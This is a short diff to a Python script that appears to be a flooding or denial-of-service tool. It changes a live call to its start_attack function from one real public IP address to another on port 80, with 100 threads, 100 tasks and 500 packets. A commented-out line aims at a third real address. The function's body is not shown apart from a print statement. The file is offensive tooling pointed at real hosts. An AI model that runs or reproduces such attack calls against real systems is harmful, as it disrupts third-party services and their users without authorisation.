@@ -93,4 +93,4 @@ def start_attack(ip, dst_port, time_loader, threads, tasks_per_thread, packets_p
     print(f"TRYING SENT . . .")
 
 #start_attack("http://135.181.79.85", 80, 30, 1, 1, 1, 1, "PYF", "GATEWAY")
-start_attack('3.71.21.92', 80, time.time() + int(20),int(100),int(100),int(500), 'PYF', 'GET')
+start_attack('3.127.134.145', 80, time.time() + int(20),int(100),int(100),int(500), 'PYF', 'GET')
